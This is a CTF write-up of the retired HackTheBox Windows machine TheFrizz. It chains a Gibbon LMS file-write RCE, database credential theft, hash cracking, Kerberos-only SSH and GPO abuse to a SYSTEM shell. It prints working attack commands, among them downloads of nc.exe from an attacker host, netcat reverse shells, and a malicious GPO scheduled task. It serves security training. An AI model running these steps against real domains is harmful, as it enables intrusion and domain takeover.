# TheFrizz — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Medium |
| Active Directory | Yes |
| IP | 10.129.232.168 |
| Domain | frizz.htb |
| DC | frizzdc.frizz.htb |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/thefrizz](https://jostif.pages.dev/writeups/thefrizz) |

**Techniques:** Gibbon LMS file write RCE → DB credential extraction → salted SHA-256 crack (hashcat -m 1420) → Kerberos-only auth (NTLM disabled) → SSH GSSAPI → BloodHound → GPO creation (Group Policy Creator Owners) → SharpGPOAbuse computer task → domain root GPO link → SYSTEM

---

---

## Introduction

TheFrizz is a Medium-rated Windows Active Directory machine themed around the Magic School Bus. Don't let the fun theme fool you — this box chains together several real-world techniques: a CVE in a learning management system, credential extraction from a database, Kerberos-only authentication (no NTLM allowed), and GPO abuse to get SYSTEM on a DC.

The full attack chain:

```
Gibbon LMS CVE (file write RCE) → DB creds → salted SHA-256 crack
→ Kerberos TGT → SSH as f.frizzle → BloodHound path
→ SSH as M.SchoolBus → GPO creation + domain root link
→ SharpGPOAbuse computer task → SYSTEM
```

One thing that makes this box different from most: **NTLM is completely disabled**. Every single tool needs to use Kerberos. This forces you to understand how Kerberos authentication actually works instead of relying on the usual pass-the-hash shortcuts.

---

## Reconnaissance

### Nmap

```bash
export IP=10.129.232.168
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt $IP
```

Key findings:

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH | OpenSSH for Windows — unusual |
| 80 | HTTP | Apache/PHP — redirects to `frizzdc.frizz.htb/home/` |
| 88 | Kerberos | Domain Controller |
| 389/3268 | LDAP | Domain: **frizz.htb** |
| 445 | SMB | Signing required, **NTLM disabled** |

Clock skew: **7 hours** — critical for Kerberos. Every tool needs `faketime -f "+7h"` prefix.

### Hosts File Setup

```bash
echo "10.129.232.168 frizzdc.frizz.htb frizz.htb" >> /etc/hosts
```

> ⚠️ Order matters for Kerberos! The first hostname in `/etc/hosts` for an IP becomes the canonical name used for SPN lookups. SSH uses it to build `host/frizzdc.frizz.htb@FRIZZ.HTB`. If `frizz.htb` comes first, SSH looks for `host/frizz.htb@FRIZZ.HTB` which doesn't exist and GSSAPI fails. Always put the FQDN of the DC first.

### SMB & LDAP Enumeration

```bash
nxc smb $IP -u '' -p ''
nxc ldap $IP -u '' -p ''
```

Both return `STATUS_NOT_SUPPORTED` — NTLM is disabled. No null session, no guest, no RID brute. We need Kerberos credentials before any AD enumeration.

### Web Enumeration

The HTTP site redirects to `http://frizzdc.frizz.htb/home/` — add that to `/etc/hosts` and browse it. It runs **Gibbon LMS**, an open-source school management system. 

---

## Foothold — Gibbon LMS RCE

### The Vulnerability

Gibbon LMS has a known file write vulnerability that allows unauthenticated users to upload a PHP web shell. The exploit abuses an AJAX endpoint in the Rubrics module that writes files to the web root without proper authentication checks.

```bash
git clone https://github.com/ulricvbs/gibbonlms-filewrite_rce.git
cd gibbonlms-filewrite_rce
python3 gibbonlms_cmd_shell.py http://frizzdc.frizz.htb/
```

> 💡 I first tried pointing it at `http://frizzdc.frizz.htb/Gibbon-LMS/` — that failed. The script expects the site root, not a subdirectory. Running it against the root works because it discovers the Gibbon installation automatically.

```
[+] Successfully uploaded web shell to http://frizzdc.frizz.htb//Gibbons-LMS/BniO.php
[*] Here's your shell:
BniO.php?cmd=> whoami
frizz\w.webservice
```

We have RCE as `frizz\w.webservice`. The web shell gets cleaned up periodically so work fast.

### Getting a Stable Shell

The box cleans uploaded files every few minutes. Upload nc.exe before the shell disappears:

```
BniO.php?cmd=> powershell -c "Invoke-WebRequest http://10.10.14.78/nc.exe -OutFile C:\xampp\htdocs\Gibbon-LMS\nc.exe"
```

```bash
# Kali
python3 -m http.server 80  # serve nc.exe
nc -lvnp 4444
```

```
BniO.php?cmd=> C:\xampp\htdocs\Gibbon-LMS\nc.exe -e cmd.exe 10.10.14.78 4444
```

---

## Credential Extraction — Gibbon LMS Database

### Reading config.php

The first thing to check in any PHP app is the database config:

```
BniO.php?cmd=> type C:\xampp\htdocs\Gibbon-LMS\config.php
```

```php
$databaseServer = 'localhost';
$databaseUsername = 'MrGibbonsDB';
$databasePassword = 'MisterGibbs!Parrot!?1';
$databaseName = 'gibbon';
```

### Querying the Database

```cmd
C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -e "SELECT username, passwordStrong, passwordStrongSalt FROM gibbon.gibbonPerson WHERE passwordStrong != '';"
```

> ⚠️ Never put a space between `-p` and the password in mysql. `-p "password"` makes mysql prompt interactively and hang forever. `-p"password"` (no space) works correctly.

Result:

```
username    passwordStrong                                                     passwordStrongSalt
f.frizzle   067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03  /aACFhikmNopqrRTVz2489
```

### Understanding the Hash Format

Before cracking, I needed to know HOW Gibbon hashes passwords. I searched the source:

```cmd
findstr /s /i "passwordStrong" C:\xampp\htdocs\Gibbon-LMS\*.php
```

Found in multiple files:
```php
$passwordStrong = hash('sha256', $salt.$password);
```

Format: `sha256(salt + password)` — hashcat mode **1420**.

### Cracking the Hash

```bash
echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > frizz_hash.txt
hashcat -m 1420 frizz_hash.txt /usr/share/wordlists/rockyou.txt
```

Result: **`f.frizzle:Jenni_Luvs_Magic23`**

---

## Kerberos Setup — The NTLM-Free Environment

This is where TheFrizz gets educational. With NTLM disabled, you can't just throw credentials at SMB and get a hash. Everything needs Kerberos tickets.

### Configuring krb5.conf

Generate it automatically with nxc:

```bash
faketime -f "+7h" nxc smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf
```

### Getting a TGT

```bash
faketime -f "+7h" kinit f.frizzle@FRIZZ.HTB
# Password: Jenni_Luvs_Magic23
```

### SSH with Kerberos

```bash
faketime -f "+7h" ssh f.frizzle@frizzdc.frizz.htb
```

This works because SSH uses GSSAPI (Kerberos) authentication when a TGT is available. The key insight from debugging: `/etc/hosts` must have `frizzdc.frizz.htb` as the **first** hostname for the IP, because SSH does a reverse lookup to build the SPN.

```
PS C:\Users\f.frizzle\Desktop> cat user.txt
e486f8c2aecdc9c89f96c60e81973612
```

---

## BloodHound — Finding the Attack Path

With valid Kerberos credentials, run BloodHound collection:

```bash
faketime -f "+7h" bloodhound-python -d frizz.htb \
  -u f.frizzle -p 'Jenni_Luvs_Magic23' \
  -dc frizzdc.frizz.htb -ns 10.129.232.168 \
  --kerberos -c all
```

**Attack path discovered:**

```
f.frizzle → [some edge] → M.SchoolBus → WriteGPLink → OU=Class_Frizz → contains v.frizzle (Domain Admin)
```

Key findings from enumeration:
- `v.frizzle` is Domain Admin and lives in `Class_Frizz` OU
- `M.SchoolBus` is in **Group Policy Creator Owners** — can create GPOs
- `M.SchoolBus` has **WriteGPLink** on the `Class_Frizz` OU
- All domain users are in `Class_Frizz` OU

---

## Lateral Movement — Getting M.SchoolBus Shell

```bash
faketime -f "+7h" kinit M.SchoolBus@FRIZZ.HTB
# enter M.SchoolBus password

faketime -f "+7h" ssh M.SchoolBus@frizzdc.frizz.htb
```

Confirm groups:

```powershell
whoami /groups
```

Confirmed: **Group Policy Creator Owners** ✓

---

## Privilege Escalation — GPO Abuse to SYSTEM

This is the most complex part of the box, and where I made several mistakes before getting it right. Let me walk through what I tried and why each thing failed.

### Understanding the Attack

The goal: create a GPO with a malicious scheduled task that runs as SYSTEM on the DC, giving us a reverse shell.

**Key components:**
- **Group Policy Creator Owners** = M.SchoolBus can create new GPOs
- **WriteGPLink** = M.SchoolBus can link GPOs to OUs
- **Scheduled Task in GPO** = runs as SYSTEM when Group Policy refreshes

### Step 1: Upload Tools

```bash
faketime -f "+7h" scp -o GSSAPIAuthentication=yes SharpGPOAbuse.exe nc.exe M.SchoolBus@frizzdc.frizz.htb:'C:/ProgramData/'
```

> 💡 C:\Windows\Temp was denied to M.SchoolBus. C:\ProgramData was writable.

### Step 2: Create and Link the GPO

```powershell
# Create GPO
New-GPO -Name "jostif"

# Link to Class_Frizz OU (WriteGPLink access)
New-GPLink -Name "jostif" -Target "OU=Class_Frizz,DC=frizz,DC=htb"

# CRITICAL: Also link to domain root so it applies to the DC computer object
New-GPLink -Name "jostif" -Target "DC=frizz,DC=htb"
```

### Why I Failed Multiple Times

**Attempt 1: pyGPOAbuse**
```bash
faketime -f "+7h" python3 pygpoabuse.py frizz.htb/M.SchoolBus -k -no-pass ...
```
Failed — `-no-pass` and `-ou` aren't valid flags in this version. Also hit `KDC_ERR_S_PRINCIPAL_UNKNOWN` when using the IP instead of hostname for `-dc-ip`.

**Attempt 2: SharpGPOAbuse with --AddComputerTask on Class_Frizz only**

The computer task would never run. Here's why:

Computer GPO tasks only apply to **computer objects** in the targeted OU. The `Class_Frizz` OU contains only **user objects** — no computers. So linking a GPO with a computer task to `Class_Frizz` does nothing because no computers receive that policy.

```
Class_Frizz OU:
  ├── f.frizzle (user) ← user GPO applies
  ├── M.SchoolBus (user) ← user GPO applies
  ├── v.frizzle (user) ← user GPO applies
  └── [no computers] ← computer GPO never applies
```

**Attempt 3: --AddUserTask**

User tasks apply to user objects — perfect for Class_Frizz. But `gpupdate /force` in an SSH session uses a **network logon** token, which doesn't process user GPO preferences the same way an interactive logon does. The task was created but never triggered.

**Attempt 4: --AddComputerTask linked to domain root ← WORKED**

The DC computer object (`FRIZZDC$`) lives in the `Domain Controllers` OU, which inherits GPOs from the **domain root** (`DC=frizz,DC=htb`).

By linking our GPO to the domain root AND using `--AddComputerTask`, the DC itself receives and processes the computer policy:

```
DC=frizz,DC=htb (domain root) ← GPO linked here
  └── OU=Domain Controllers
        └── FRIZZDC$ (computer) ← inherits GPO, processes computer tasks
```

### Step 3: Verify SYSTEM Execution

First test with a harmless command:

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "jostif" --Author "NT AUTHORITY\SYSTEM" --TaskName "Test1" --Command "cmd.exe" --Arguments "/c whoami > C:\ProgramData\test.txt" --Force

gpupdate /force
cat C:\ProgramData\test.txt
# nt authority\system ← confirmed!
```

### Step 4: Reverse Shell as SYSTEM

```powershell
.\SharpGPOAbuse.exe --AddComputerTask --GPOName "jostif" --Author "NT AUTHORITY\SYSTEM" --TaskName "RevShell" --Command "cmd.exe" --Arguments "/c C:\ProgramData\nc.exe -e cmd.exe 10.10.14.78 5555" --Force
```

```bash
# Kali
nc -lvnp 5555
```

```powershell
gpupdate /force
```

```
connect to [10.10.14.78] from (UNKNOWN) [10.129.4.235] 55697
Microsoft Windows [Version 10.0.20348.3207]

C:\Windows\system32> whoami
nt authority\system
```

### Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
7b208fe71bfca87b1c1c1f03f33e7957
```

---

## What I Learned About GPO Computer vs User Tasks

This is worth understanding deeply since it trips up a lot of people.

### GPO Scope

A GPO applies to **objects in the OU it's linked to**:
- If linked to an OU with users → user configuration applies to those users
- If linked to an OU with computers → computer configuration applies to those computers
- If linked to the domain root → applies to ALL objects in the domain

### Scheduled Tasks in GPO

| Task Type | Applies To | Runs When |
|-----------|-----------|-----------|
| Computer Task | Computer objects in scope | Any user logs on, or gpupdate on that machine |
| User Task | User objects in scope | That specific user logs on (interactive) |

### Why Network Logon Breaks User GPO Tasks

SSH creates a **network logon** (type 3). User GPO preferences and scheduled tasks are designed for **interactive logons** (type 2). The `gpupdate /force` command in an SSH session only reliably applies computer policy, not user policy preferences like scheduled tasks.

### The Winning Combination

1. Create GPO as M.SchoolBus (Group Policy Creator Owners)
2. Link to domain root (inheritance reaches Domain Controllers OU → DC computer object)
3. Use `--AddComputerTask` (applies to computers, runs as SYSTEM)
4. `gpupdate /force` triggers immediate processing

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| Initial access | Gibbon LMS unauthenticated file write RCE | gibbonlms-filewrite_rce |
| Credential extraction | MySQL query for salted SHA-256 hash | mysql.exe |
| Hash cracking | sha256($salt.$pass) dictionary attack | hashcat -m 1420 |
| Kerberos setup | TGT request with clock skew compensation | faketime + kinit |
| SSH access | GSSAPI (Kerberos) auth | ssh |
| AD enumeration | Kerberos-authenticated collection | bloodhound-python |
| GPO creation | Group Policy Creator Owners membership | PowerShell |
| SYSTEM shell | Computer task in domain-root-linked GPO | SharpGPOAbuse |

---

## Key Lessons

**1. NTLM disabled means everything needs Kerberos**  
When `STATUS_NOT_SUPPORTED` appears on SMB, NTLM is off. Every tool needs `-k` flag and a valid TGT. Get comfortable with `kinit`, `klist`, and `faketime`. Prefix every command with `faketime -f "+Xh"` when clock skew exists.

**2. /etc/hosts order matters for Kerberos**  
The first hostname listed for an IP is the canonical name used for reverse lookups. SSH builds the Kerberos SPN from this. If the wrong hostname comes first, GSSAPI fails with "Permission denied" even with a valid TGT.

**3. GPO computer tasks need computer objects in scope**  
The most important thing I learned on this box. Linking a GPO with a computer task to an OU full of users does nothing. The task only runs on machines whose computer account is in scope. Linking to the domain root solves this by making the DC itself receive the policy via inheritance.

**4. User GPO tasks don't trigger in SSH sessions**  
SSH creates network logon tokens (type 3). User GPO scheduled tasks require interactive logons (type 2). For reliable GPO task execution via a remote shell, use computer tasks and link to a scope that includes the machine you're on.

**5. Always check what OU contains what objects before choosing GPO attack type**  
Before running SharpGPOAbuse, run `Get-ADUser -Filter * -SearchBase "OU=..."` and `Get-ADComputer -Filter * -SearchBase "OU=..."` to understand what's in each OU. That determines whether to use `--AddComputerTask` or `--AddUserTask`.

**6. Salted hashes need the right hashcat mode**  
`sha256($salt.$pass)` = mode 1420. Format: `hash:salt`. Getting the salt order wrong means zero cracks even with the right password in the wordlist. Always read the source code to confirm the exact hashing implementation.
